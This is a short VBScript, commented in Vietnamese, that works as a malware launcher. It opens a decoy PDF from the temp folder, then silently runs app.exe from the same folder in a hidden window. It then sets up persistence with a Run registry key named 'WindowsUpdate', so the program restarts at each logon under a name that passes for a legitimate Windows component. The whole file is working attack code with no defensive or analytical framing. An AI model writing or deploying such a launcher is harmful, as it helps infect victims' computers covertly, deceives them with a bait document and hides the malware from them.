Set WshShell = CreateObject("WScript.Shell")
strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")

' 1. Mở file PDF mồi nhử ngay lập tức
WshShell.Run "cmd /c start """" """ & strTemp & "\decoy.pdf""", 0, False

' 2. Chạy app.exe ngầm
WshShell.Run """" & strTemp & "\app.exe""", 0, False

' 3. Thiết lập Persistence (Tự khởi động cùng Windows)
' Nó sẽ ghi vào Registry để mỗi lần mở máy app.exe sẽ tự chạy
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate"
WshShell.RegWrite strRegPath, strTemp & "\app.exe", "REG_SZ"
